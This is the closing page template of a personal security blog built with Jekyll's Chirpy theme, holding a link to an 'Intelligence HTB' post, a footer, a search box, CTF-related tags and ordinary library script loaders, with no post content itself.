  <a href="/posts/Intelligence/" class="btn btn-outline-primary"
    prompt="Newer">
    <p>Intelligence HTB</p>
  </a>
  

</div>


    

    </div> <!-- #post-extend-wrapper -->

  </div> <!-- .col-* -->

</div> <!-- .row -->



        <!--
  The Footer
-->

<footer class="d-flex w-100 justify-content-center">
  <div class="d-flex justify-content-between align-items-center">
    <div class="footer-left">
      <p class="mb-0">
        © 2022
        <a href="https://twitter.com/t1nyb0y">tinyb0y</a>.
        
        <span data-toggle="tooltip" data-placement="top"
          title="Except where otherwise noted, the blog posts on this site are licensed under the Creative Commons Attribution 4.0 International (CC BY 4.0) License by the author.">Some rights reserved.</span>
        
      </p>
    </div>

    <div class="footer-right">
      <p class="mb-0">
        

        

        Powered by 
          <a href="https://jekyllrb.com" target="_blank" rel="noopener">Jekyll</a>
         with 
          <a href="https://github.com/cotes2020/jekyll-theme-chirpy" target="_blank" rel="noopener">Chirpy</a>
         theme.

      </p>
    </div>

  </div> <!-- div.d-flex -->
</footer>


      </div>

      <!--
  The Search results
-->
<div id="search-result-wrapper" class="d-flex justify-content-center unloaded">
  <div class="col-12 col-sm-11 post-content">
    <div id="search-hints">
      <h4 class="text-muted mb-4">Trending Tags</h4>

      















  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
  
    
    
    
    
      
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
  
    
    
    
    
      
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
  
    
    
    
    
      
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
  
    
    
    
    
      
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
        
        



      
        
        <a class="post-tag" href="/tags/hackthebox/">hackthebox</a>
      
        
        <a class="post-tag" href="/tags/active-directory/">active directory</a>
      
        
        <a class="post-tag" href="/tags/easy/">easy</a>
      
        
        <a class="post-tag" href="/tags/hacks/">hacks</a>
      
        
        <a class="post-tag" href="/tags/hard/">hard</a>
      
        
        <a class="post-tag" href="/tags/linux/">linux</a>
      
        
        <a class="post-tag" href="/tags/ldap/">ldap</a>
      
        
        <a class="post-tag" href="/tags/tryhackme/">tryhackme</a>
      
        
        <a class="post-tag" href="/tags/windows/">windows</a>
      
        
        <a class="post-tag" href="/tags/bloodhound/">bloodhound</a>
      

    </div>
    <div id="search-results" class="d-flex flex-wrap justify-content-center text-muted mt-3"></div>
  </div>
</div>


    </div> <!-- #main-wrapper -->

    
      <!--
  mermaid-js loader
-->

<script src="https://cdn.jsdelivr.net/npm/mermaid@8/dist/mermaid.min.js"></script>
<script>
  $(function() {
    let initTheme = "default";

    if ($("html[mode=dark]").length > 0
      || ($("html[mode]").length == 0
        && window.matchMedia("(prefers-color-scheme: dark)").matches ) ) {
      initTheme = "dark";
    }

    let mermaidConf = {
      theme: initTheme  /* <default|dark|forest|neutral> */
    };

    /* Markdown converts to HTML */
    $("pre").has("code.language-mermaid").each(function() {
      let svgCode = $(this).children().html();
      $(this).addClass("unloaded");
      $(this).after(`<div class=\"mermaid\">${svgCode}</div>`);
    });

    mermaid.initialize(mermaidConf);
  });
</script>

    

    <div id="mask"></div>

    <a id="back-to-top" href="#" aria-label="back-to-top" class="btn btn-lg btn-box-shadow" role="button">
      <i class="fas fa-angle-up"></i>
    </a>

    <!--
  Jekyll Simple Search loader
  See: <https://github.com/christian-fei/Simple-Jekyll-Search>
-->





<script src="https://cdn.jsdelivr.net/npm/simple-jekyll-search@1.7.3/dest/simple-jekyll-search.min.js"></script>

<script>
SimpleJekyllSearch({
  searchInput: document.getElementById('search-input'),
  resultsContainer: document.getElementById('search-results'),
  json: '/assets/js/data/search.json',
  searchResultTemplate: '<div class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-lg-4 pr-lg-4 pl-xl-0 pr-xl-0">  <a href="http://0.0.0.0:4000{url}">{title}</a>  <div class="post-meta d-flex flex-column flex-sm-row text-muted mt-1 mb-1">    {categories}    {tags}  </div>  <p>{snippet}</p></div>',
  noResultsText: '<p class="mt-5">Oops! No result founds.</p>',
  templateMiddleware: function(prop, value, template) {
    if (prop === 'categories') {
      if (value === '') {
        return `${value}`;
      } else {
        return `<div class="mr-sm-4"><i class="far fa-folder fa-fw"></i>${value}</div>`;
      }
    }

    if (prop === 'tags') {
      if (value === '') {
        return `${value}`;
      } else {
        return `<div><i class="fa fa-tag fa-fw"></i>${value}</div>`;
      }
    }
  }
});
</script>


    <!--
  JS selector for site.
-->

<!-- layout specified -->


  



  <!-- image lazy-loading & popup -->
  <script src="https://cdn.jsdelivr.net/combine/npm/lozad/dist/lozad.min.js,npm/magnific-popup@1/dist/jquery.magnific-popup.min.js"></script>





<script defer src="/assets/js/dist/post.min.js"></script>


  <!-- MathJax -->
  <script>
  /* see: <https://docs.mathjax.org/en/latest/options/input/tex.html#tex-options> */
  MathJax = {
    tex: {
      inlineMath: [              /* start/end delimiter pairs for in-line math */
        ['$','$'],
        ['\\(','\\)']
      ],
      displayMath: [             /* start/end delimiter pairs for display math */
        ['$$', '$$'],
        ['\\[', '\\]']
      ]
    }
  };
  </script>
  <script src="https://polyfill.io/v3/polyfill.min.js?features=es6"></script>
  <script type="text/javascript" id="MathJax-script" async
    src="https://cdn.jsdelivr.net/npm/mathjax@3/es5/tex-chtml.js">
  </script>


<!-- commons -->

<script src="https://cdn.jsdelivr.net/combine/npm/popper.js@1.16.1,npm/bootstrap@4/dist/js/bootstrap.min.js"></script>




  </body>

</html>

